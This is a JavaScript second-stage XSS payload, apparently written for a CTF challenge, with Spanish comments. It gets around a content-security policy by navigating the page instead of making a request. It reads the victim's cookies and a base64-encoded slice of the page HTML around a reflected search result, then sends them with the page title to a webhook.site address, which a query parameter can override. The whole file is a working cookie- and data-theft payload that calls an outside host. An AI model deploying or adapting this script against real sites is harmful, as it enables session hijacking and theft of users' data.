/**
 * Segunda etapa: exfil por navegacion (CSP default-src bloquea fetch/img a terceros).
 *
 * Webhook: primero data-wh (ping-loader -> __CTF_WEBHOOK__). Luego la query ?w=
 * sobrescribe WH; si hay varios w, gana el ultimo (URLSearchParams.get solo devuelve el primero).
 * Pon tu webhook al final: ...&w=https%3A%2F%2Fwebhook.site%2F... para pisar trackers.
 */
(function () {
  var WH = "https://webhook.site/ddfc979f-7c8c-4860-a3c3-dc75213cb108";
  try {
    if (typeof window.__CTF_WEBHOOK__ === "string" && window.__CTF_WEBHOOK__.length) {
      WH = window.__CTF_WEBHOOK__;
      try {
        delete window.__CTF_WEBHOOK__;
      } catch (e) {
        window.__CTF_WEBHOOK__ = "";
      }
    }
  } catch (e) {}
  try {
    var lastW = null;
    new URLSearchParams(window.location.search).forEach(function (v, k) {
      if (k === "w" && /^https?:\/\//i.test(v)) lastW = v;
    });
    if (lastW) WH = lastW;
  } catch (e) {}
  var c = "";
  try {
    c = document.cookie;
  } catch (e) {
    c = String(e);
  }
  var h = "";
  try {
    h = document.documentElement ? document.documentElement.outerHTML : "";
    /* CurePoint flag suele ir tras el reflejo XSS (bloque resultados / footer). */
    var needle = "Showing results for:";
    var i = h.indexOf(needle);
    if (i >= 0) {
      h = h.slice(Math.max(0, i - 120), Math.min(h.length, i + 3380));
    } else if (h.length > 3500) {
      h = h.slice(-3500);
    }
    h = btoa(unescape(encodeURIComponent(h)));
    if (h.length > 4000) h = h.slice(0, 4000);
  } catch (e) {
    h = btoa(String(e));
  }
  window.location =
    WH +
    "?ping=1&c=" +
    encodeURIComponent(c) +
    "&t=" +
    encodeURIComponent(document.title || "") +
    "&d=" +
    encodeURIComponent(h);
})();
